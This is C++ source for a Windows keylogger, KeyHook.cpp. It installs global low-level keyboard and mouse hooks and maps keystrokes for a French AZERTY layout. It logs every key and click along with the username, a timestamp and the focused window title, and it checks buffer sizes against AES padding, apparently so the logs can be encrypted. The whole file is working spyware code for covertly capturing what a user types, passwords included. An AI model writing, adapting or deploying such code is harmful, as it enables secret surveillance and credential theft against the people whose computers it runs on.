// KeyHook.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "KeyHook.hh"

HHOOK						g_keyboardHook = NULL;
HHOOK						g_mouseHook = NULL;
KBDLLHOOKSTRUCT				g_hookStruct;
std::map<int, const char*>	g_keyboardMap;
std::map<int, const char*>	g_keyboardMapMaj;
std::string					g_buffer;
std::string					g_tmpBuffer;

KeyHook::KeyHook()
{
	initKeyboardMap();
	initKeyboardMapMaj();
	findCurrentUserName();
}

KeyHook::~KeyHook()
{
}

void				KeyHook::initKeyboardMap()
{
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F1, "[{F1}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F2, "[{F2}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F3, "[{F3}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F4, "[{F4}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F5, "[{F5}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F6, "[{F6}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F7, "[{F7}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F8, "[{F8}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F9, "[{F9}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F10, "[{F10}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F11, "[{F11}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_F12, "[{F12}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD0, "[{NUM0}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD1, "[{NUM1}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD2, "[{NUM2}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD3, "[{NUM3}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD4, "[{NUM4}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD5, "[{NUM5}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD6, "[{NUM6}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD7, "[{NUM7}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD8, "[{NUM8}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMPAD9, "[{NUM9}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_MULTIPLY, "[{NUM MULTIPLY}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_ADD, "[{NUM ADD}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_SEPARATOR, "[{NUM SEPARATOR}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_SUBTRACT, "[{NUM SUBSTRACT}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_DECIMAL, "[{NUM DECIMAL}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_DIVIDE, "[{NUM DIVIDE}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NUMLOCK, "[{NUM LOCK}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_SCROLL, "[{SCROLL LOCK}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_LEFT, "[{LEFT}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_RIGHT, "[{RIGHT}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_UP, "[{UP}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_DOWN, "[{DOWN}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_BACK, "[{BACKSPACE}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_TAB, "[{TAB}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_CLEAR, "[{CLEAR}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_RETURN, "[{ENTER}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_CONTROL, "[{CONTROL}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_LCONTROL, "[{LEFT CONTROL}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_RCONTROL, "[{RIGHT CONTROL}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_MENU, "[{MENU}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_LMENU, "[{LEFT MENU}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_RMENU, "[{RIGHT MENU}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_PAUSE, "[{PAUSE}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_ESCAPE, "[{ESCAPE}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_PRIOR, "[{PAGE UP}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_NEXT, "[{PAGE DOWN}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_END, "[{END}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_HOME, "[{HOME}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_SELECT, "[{SELECT}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_PRINT, "[{PRINT}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_EXECUTE, "[{EXECUTE}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_SNAPSHOT, "[{PRINT SCREEN}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_INSERT, "[{INSERT}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_DELETE, "[{DELETE}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_HELP, "[{HELP}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_LWIN, "[{LEFT WINDOWS KEY}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_RWIN, "[{RIGHT WINDOWS KEY}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_APPS, "[{APPLICATION KEY}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_SLEEP, "[{SLEEP KEY}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_VOLUME_MUTE, "[{VOLUME MUTE}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_VOLUME_UP, "[{VOLUME UP}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_VOLUME_DOWN, "[{VOLUME DOWN}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_MEDIA_NEXT_TRACK, "[{NEXT TRACK}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_MEDIA_PREV_TRACK, "[{PREVIOUS TRACK}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_MEDIA_STOP, "[{STOP TRACK}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_MEDIA_PLAY_PAUSE, "[{PLAY/PAUSE TRACK}"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_1, "[$"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_2, "[:"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_3, "[ù"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_4, "[)"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_5, "[*"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_6, "[^"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_7, "[²"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_8, "[!"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_102, "[<"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_PLUS, "[="));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_COMMA, "[,"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_MINUS, "[-"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_OEM_PERIOD, "[;"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x30, "[à"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x31, "[&"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x32, "[é"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x33, "[\""));
	g_keyboardMap.insert(std::pair<int, const char*>(0x34, "[\'"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x35, "[("));
	g_keyboardMap.insert(std::pair<int, const char*>(0x36, "[-"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x37, "[è"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x38, "[_"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x39, "[ç"));
	g_keyboardMap.insert(std::pair<int, const char*>(VK_SPACE, "[ "));
	g_keyboardMap.insert(std::pair<int, const char*>(0x41, "[a"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x42, "[b"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x43, "[c"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x44, "[d"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x45, "[e"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x46, "[f"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x47, "[g"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x48, "[h"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x49, "[i"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x4A, "[j"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x4B, "[k"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x4C, "[l"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x4D, "[m"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x4E, "[n"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x4F, "[o"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x50, "[p"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x51, "[q"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x52, "[r"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x53, "[s"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x54, "[t"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x55, "[u"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x56, "[v"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x57, "[w"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x58, "[x"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x59, "[y"));
	g_keyboardMap.insert(std::pair<int, const char*>(0x5A, "[z"));
}

void				KeyHook::initKeyboardMapMaj()
{
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_8, "[§"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_2, "[/"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_PERIOD, "[."));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_COMMA, "[?"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_102, "[>"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_1, "[£"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_3, "[%"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_4, "[°"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_5, "[µ"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_6, "[¨"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(VK_OEM_PLUS, "[+"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x30, "[0"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x31, "[1"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x32, "[2"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x33, "[3"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x34, "[4"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x35, "[5"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x36, "[6"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x37, "[7"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x38, "[8"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x39, "[9"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x41, "[A"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x42, "[B"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x43, "[C"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x44, "[D"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x45, "[E"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x46, "[F"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x47, "[G"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x48, "[H"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x49, "[I"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x4A, "[J"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x4B, "[K"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x4C, "[L"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x4D, "[M"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x4E, "[N"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x4F, "[O"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x50, "[P"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x51, "[Q"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x52, "[R"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x53, "[S"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x54, "[T"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x55, "[U"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x56, "[V"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x57, "[W"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x58, "[X"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x59, "[Y"));
	g_keyboardMapMaj.insert(std::pair<int, const char*>(0x5A, "[Z"));
}

void				KeyHook::setHook()
{
	if ((g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookCallback, NULL, 0)) == NULL)
		std::cerr << "Error: Failed to install keyboard hook" << std::endl;
	if ((g_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookCallback, NULL, 0)) == NULL)
		std::cerr << "Error: Failed to install mouse hook" << std::endl;
}

void				KeyHook::unsetHook()
{
	UnhookWindowsHookEx(g_keyboardHook);
	UnhookWindowsHookEx(g_mouseHook);
}

const std::string	&KeyHook::getUserName() const
{
	return (_userName);
}

const std::string	&KeyHook::getKey()
{
	getCurrentDateTime();
	getFocusedWindowTitle();
	g_tmpBuffer = _userName + _BUFFER_SEPARATOR + _currentDateTime + _BUFFER_SEPARATOR + _windowTitle + _BUFFER_SEPARATOR + g_buffer;
	g_buffer.clear();
	return (g_tmpBuffer);
}

bool				KeyHook::bufferIsPadded()
{
	getCurrentDateTime();
	getFocusedWindowTitle();
	return (!((_userName.size() + _currentDateTime.size() + _windowTitle.size() + g_buffer.size() + _NB_BUFFER_SEPARATOR) % _AES_PADDING_SIZE));
}

void				KeyHook::findCurrentUserName()
{
	DWORD			len = UNLEN + 1;
	wchar_t			usernameUnicode[UNLEN + 1] = { 0 };
	char			usernameUtf[UNLEN + 1] = { 0 };

	GetUserName(usernameUnicode, &len);
	std::wcstombs(usernameUtf, usernameUnicode, sizeof(usernameUnicode));
	_userName.append(usernameUtf);
}

void				KeyHook::getFocusedWindowTitle()
{
	size_t			pos;
	wchar_t			windowTitleUnicode[MAX_PATH] = { 0 };
	char			windowTitleUtf[MAX_PATH] = { 0 };
	HWND			hwnd;

	hwnd = GetForegroundWindow();
	GetWindowText(hwnd, windowTitleUnicode, sizeof(windowTitleUnicode));
	std::wcstombs(windowTitleUtf, windowTitleUnicode, sizeof(windowTitleUnicode));
	_windowTitle.clear();
	_windowTitle.append(windowTitleUtf);
	if ((pos = _windowTitle.find_last_of("\\")) != std::string::npos)
		_windowTitle = &(_windowTitle.at(pos + 1));
}

void				KeyHook::getCurrentDateTime()
{
	time_t			rawTime;	
	struct tm		*timeInfo;
	char			buffer[MAX_PATH] = { 0 };

	time(&rawTime);
	timeInfo = localtime(&rawTime);
	strftime(buffer, sizeof(buffer), _FORMAT_DATETIME, timeInfo);
	_currentDateTime.clear();
	_currentDateTime.append(buffer);
}

bool				KeyHook::bufferIsEmpty()
{
	return (g_buffer.empty());
}

LRESULT __stdcall	KeyHook::mouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	POINT			p;

	if (nCode >= 0)
	{
		GetCursorPos(&p);
		if (wParam == WM_LBUTTONDOWN)
			g_buffer += "[CG;" + std::to_string(p.x) + ";" + std::to_string(p.y);
		else if (wParam == WM_RBUTTONDOWN)
			g_buffer += "[CD;" + std::to_string(p.x) + ";" + std::to_string(p.y);
	}
	return (CallNextHookEx(g_mouseHook, nCode, wParam, lParam));
}

LRESULT __stdcall	KeyHook::keyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	static bool		shiftPress = false;
	static bool		isCapsLock = false;
	static bool		isShiftLock = false;

	if (nCode >= 0)
	{
		g_hookStruct = *((KBDLLHOOKSTRUCT*)lParam);
		if (wParam == WM_KEYDOWN && ((g_hookStruct.vkCode == VK_RSHIFT) || (g_hookStruct.vkCode == VK_LSHIFT)))
			shiftPress = true;
		else if (wParam == WM_KEYDOWN && g_hookStruct.vkCode == VK_CAPITAL)
			isCapsLock = !isCapsLock;
		else if (wParam == WM_KEYUP)
		{
			if (shiftPress)
			{
				isShiftLock = true;
				shiftPress = false;
			}
			if ((g_hookStruct.vkCode == VK_RSHIFT) || (g_hookStruct.vkCode == VK_LSHIFT))
				isShiftLock = false;
			if (((isShiftLock && !isCapsLock) || (!isShiftLock  && isCapsLock)) && g_keyboardMapMaj.find(g_hookStruct.vkCode) != g_keyboardMapMaj.end())
				g_buffer += g_keyboardMapMaj[g_hookStruct.vkCode];
			else if (((!isShiftLock && !isCapsLock) || (isShiftLock && isCapsLock)) && g_keyboardMap.find(g_hookStruct.vkCode) != g_keyboardMap.end())
				g_buffer += g_keyboardMap[g_hookStruct.vkCode];
		}
	}
	return (CallNextHookEx(g_keyboardHook, nCode, wParam, lParam));
}

void				hookHandlingLoop(KeyHook &keyHooker)
{
	MSG				msg;

	keyHooker.setHook();
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	keyHooker.unsetHook();
}